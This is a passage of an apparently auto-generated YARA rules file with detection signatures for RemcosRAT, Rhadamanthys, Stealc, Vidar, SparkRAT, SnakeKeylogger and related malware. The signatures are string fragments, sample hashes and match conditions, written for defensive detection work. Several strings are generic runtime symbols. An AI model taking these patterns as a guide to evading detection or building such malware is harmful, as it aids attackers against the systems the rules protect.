      $s7 = "FAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAAD" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s9 = "AAAAACAAACA" ascii /* base64 encoded string '        ' */ /* score: '12.50'*/
      $s10 = "U4pKAVZXicONdBEKi3wRBosWi0YEAdiLErkBAAAA6AsAAACDxghPf+dfXlvDkIXJD4SKAAAAU1ZXicOJ1onPMdKKBopWATHJPAp0IjwLdB48DHQkPA10MzwOdE08D3QO" ascii /* score: '11.00'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABMAQkAGV5CKgAAAAAAAAAA4ACOgQsB" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__aa569300_129 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '             ' */ /* score: '16.50'*/
      $s2 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */ /* score: '16.50'*/
      $s3 = "BAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                 ' */ /* score: '16.50'*/
      $s4 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                             ' */ /* score: '14.50'*/
      $s5 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '14.50'*/
      $s6 = "bAAAAAAAAB" ascii /* base64 encoded string 'l      ' */ /* score: '14.00'*/
      $s7 = "b25FeEEAAAB" ascii /* base64 encoded string 'onExA   ' */ /* score: '14.00'*/
      $s8 = "wn1Ki0UIi0DIi0BMixD/UiCLVQiLUvyLTQgrUfQr0NH6eQOD0gCLRQgDUPRCi0UIiVD0i0UIi0DIi0BMixD/UiCLVQgDQvSLVQiJQvyLRQiLQMiLSEyLRQiNUPCLRQiL" ascii /* score: '11.00'*/
      $s9 = "lDucO6Q7rDu0O7w7xDvMO9Q73DvkO+w79Dv8OwQ8DDwUPBw8JDwsPDQ8PDxEPEw8VDxcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9" ascii /* score: '11.00'*/
      $s10 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* score: '8.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imph_130 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s2 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s4 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s5 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */ /* score: '17.00'*/
      $s6 = "ntdll.dlH" fullword ascii /* score: '15.00'*/
      $s7 = "winmm.dlH" fullword ascii /* score: '10.00'*/
      $s8 = "WSAGetOvH" fullword ascii /* score: '9.00'*/
      $s9 = "GetSysteH" fullword ascii /* score: '9.00'*/
      $s10 = "wine_getH" fullword ascii /* score: '9.00'*/
      $s11 = "kernel32H" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphas_131 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash3 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '25.00'*/
      $s2 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '24.00'*/
      $s3 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '24.00'*/
      $s4 = "sweep: bad span statenot a XENIX named type fileprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack" ascii /* score: '23.00'*/
      $s5 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '19.00'*/
      $s6 = "kroot jobsmakechan: bad alignmentnanotime returning zerono space left on deviceoperation not permittedoperation not supportedpan" ascii /* score: '15.00'*/
      $s7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '14.00'*/
      $s8 = "ault address CertFreeCertificateContextGODEBUG: can not disable \"GetFileInformationByHandlePostQueuedCompletionStatusQueryPerfo" ascii /* score: '11.00'*/
      $s9 = "sched={pc: but progSize  nmidlelocked= out of range  procedure in  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s10 = "t.bpbad use of bucket.mpchan send (nil chan)close of nil channelconnection timed outdodeltimer0: wrong Pfloating point errorforc" ascii /* score: '10.00'*/
      $s11 = " failedruntime: s.allocCount= s.allocCount > s.nelemsschedule: holding locksshrinkstack at bad timespan has no free stacksstack " ascii /* score: '10.00'*/
      $s12 = "=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: netpollinit failedruntime: thread ID overflowruntime" fullword ascii /* score: '10.00'*/
      $s13 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '9.00'*/
      $s14 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments GODEBUG: can not enable \"Get" ascii /* score: '8.00'*/
      $s15 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerNameWGetFullPathName" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__132 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash11 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash12 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash13 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash14 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash15 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash16 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash17 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash18 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s3 = "runtime.printcomplex" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.printslice" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.throw.func1" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.checkmcount" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.panicfloat" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.printfloat" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.fmtNSAsMS" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.fatalthrow.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.panicoverflow" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.exitThread" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.throw" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fatalthrow" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.panicmem" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__133 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "NFindInterfaceMethodImplementationTarget" fullword ascii /* score: '14.00'*/
      $s2 = "LGetCultureNotSupportedExceptionMessage GetCultureByName" fullword ascii /* score: '12.00'*/
      $s3 = "(GetSystemArrayEEType" fullword ascii /* score: '12.00'*/
      $s4 = "*GetUserDefaultCulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s5 = "\"GetArgumentString" fullword ascii /* score: '9.00'*/
      $s6 = "\"GetNewThunksBlock" fullword ascii /* score: '9.00'*/
      $s7 = "get_CultureName6get_TwoLetterISOCountryName(get_NumberGroupSizes@" fullword ascii /* score: '9.00'*/
      $s8 = ",IcuGetTimeFormatString@" fullword ascii /* score: '9.00'*/
      $s9 = "&GetCodePageDataItem" fullword ascii /* score: '9.00'*/
      $s10 = " IcuGetLocaleInfo@" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( all of them )
      ) or ( all of them )
}

